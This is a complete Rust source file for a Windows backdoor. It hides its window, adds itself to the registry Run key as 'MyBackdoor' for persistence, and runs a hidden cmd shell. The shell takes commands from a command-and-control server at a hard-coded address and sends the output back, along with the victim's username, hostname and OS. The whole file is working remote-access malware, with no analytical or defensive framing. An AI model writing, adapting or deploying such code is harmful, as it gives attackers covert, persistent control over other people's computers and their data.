#![windows_subsystem = "windows"]

use reqwest;
use serde::{Deserialize, Serialize};
use std::{
    env,
    io::{Read, Write},
    process::{Command, Stdio},
    sync::{Arc, Mutex},
    thread,
    time::{Duration, Instant},
};
use chrono::Utc;
use whoami;
use winreg::enums::*;
use winreg::RegKey;

// CONFIG
mod config {
    pub const SERVER_URL: &str = "http://192.168.1.41:8080";
    pub const TELEMETRY_PATH: &str = "/telemetry";
    pub const COMMAND_PATH: &str = "/get_command";
    pub const RESULT_PATH: &str = "/send_result";
    pub const POLL_INTERVAL_SECS: u64 = 5;
}

// TELEMETRY DATA STRUCTURE
#[derive(Serialize)]
struct Telemetry {
    user: String,
    host: String,
    os: String,
    timestamp: String,
}

// MAIN FUNCTION
fn main() -> anyhow::Result<()> {
    // It's often better to run persistence setup in a way that doesn't block the main loop
    // if it fails, but for this example, we'll let it propagate.
    if let Err(e) = setup_persistence() {
        // In a real scenario, you might log this error somewhere instead of printing.
        eprintln!("Persistence setup failed: {}", e);
    }

    // Send initial telemetry
    if let Err(e) = send_telemetry() {
        eprintln!("Initial telemetry failed: {}", e);
    }

    // Spawn persistent shell process
    let mut child = Command::new("cmd")
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped()) // Capture stderr as well
        .spawn()?;

    let mut child_stdin = child.stdin.take().unwrap();
    let mut child_stdout = child.stdout.take().unwrap();
    let mut child_stderr = child.stderr.take().unwrap();

    // Thread-safe buffer for shell output
    let output_buffer = Arc::new(Mutex::new(Vec::new()));

    // Thread to read stdout
    let stdout_buffer_clone = Arc::clone(&output_buffer);
    thread::spawn(move || {
        let mut buf = [0u8; 1024];
        loop {
            match child_stdout.read(&mut buf) {
                Ok(n) if n > 0 => {
                    let mut data = stdout_buffer_clone.lock().unwrap();
                    data.extend_from_slice(&buf[..n]);
                }
                _ => thread::sleep(Duration::from_millis(100)),
            }
        }
    });

    // Thread to read stderr
    let stderr_buffer_clone = Arc::clone(&output_buffer);
    thread::spawn(move || {
        let mut buf = [0u8; 1024];
        loop {
            match child_stderr.read(&mut buf) {
                Ok(n) if n > 0 => {
                    let mut data = stderr_buffer_clone.lock().unwrap();
                    data.extend_from_slice(&buf[..n]);
                }
                _ => thread::sleep(Duration::from_millis(100)),
            }
        }
    });


    let mut last_telemetry_time = Instant::now();

    loop {
        // 1. Fetch command from C2
        if let Ok(cmd) = fetch_command() {
            if !cmd.trim().is_empty() {
                // 2. Write command to shell's stdin
                // The Python server adds the newline, so we don't need to.
                child_stdin.write_all(cmd.as_bytes())?;
                child_stdin.write_all(b"\n")?; // Ensure command execution
                child_stdin.flush()?;
            }
        }

        // 3. Read output from buffer and send to C2
        // Add a small delay to allow the command to execute and produce output
        thread::sleep(Duration::from_millis(500));
        let output = {
            let mut data = output_buffer.lock().unwrap();
            if !data.is_empty() {
                let s = String::from_utf8_lossy(&data).to_string();
                data.clear();
                s
            } else {
                String::new()
            }
        };

        if !output.is_empty() {
            let _ = send_result(&output);
        }

        // 4. Send periodic telemetry (e.g., every 60 seconds)
        if last_telemetry_time.elapsed().as_secs() > 60 {
            let _ = send_telemetry();
            last_telemetry_time = Instant::now();
        }

        thread::sleep(Duration::from_secs(config::POLL_INTERVAL_SECS));
    }
}

// Setup persistence via Registry (Windows)
fn setup_persistence() -> anyhow::Result<()> {
    let exe_path = env::current_exe()?;
    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    let path = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    let (key, _disp) = hkcu.create_subkey(&path)?;
    key.set_value("MyBackdoor", &exe_path.to_str().unwrap_or_default())?;
    Ok(())
}

// Fetch command from C2 server
fn fetch_command() -> anyhow::Result<String> {
    let client = reqwest::blocking::Client::new();
    let url = format!("{}{}", config::SERVER_URL, config::COMMAND_PATH);

    #[derive(Serialize)]
    struct CommandRequest {
        host: String,
    }

    #[derive(Deserialize)]
    struct CommandResponse {
        command: String,
    }

    let payload = CommandRequest {
        host: whoami::fallible::hostname().unwrap_or_else(|_| "unknown".to_string()),
    };

    let resp = client.post(&url).json(&payload).send()?;
    let cmd_resp = resp.json::<CommandResponse>()?;

    Ok(cmd_resp.command)
}

// Send command result back to C2 server
fn send_result(result: &str) -> anyhow::Result<()> {
    let client = reqwest::blocking::Client::new();
    let url = format!("{}{}", config::SERVER_URL, config::RESULT_PATH);

    #[derive(Serialize)]
    struct ResultPayload {
        command: String, // The C2 expects a "command" field
        output: String,
        user: String,
        host: String,
    }
    let payload = ResultPayload {
        command: "interactive_shell".to_string(), // Command is part of a stream
        output: result.to_string(),
        user: whoami::username(),
        host: whoami::fallible::hostname().unwrap_or_else(|_| "unknown".to_string()),
    };

    client.post(&url).json(&payload).send()?.error_for_status()?;
    Ok(())
}

// Send system telemetry
fn send_telemetry() -> anyhow::Result<()> {
    let client = reqwest::blocking::Client::new();
    let telemetry = Telemetry {
        user: whoami::username(),
        host: whoami::fallible::hostname().unwrap_or_else(|_| "unknown".to_string()),
        os: whoami::platform().to_string(),
        timestamp: Utc::now().to_rfc3339(),
    };
    let url = format!("{}{}", config::SERVER_URL, config::TELEMETRY_PATH);

    client.post(&url).json(&telemetry).send()?.error_for_status()?;
    Ok(())
}
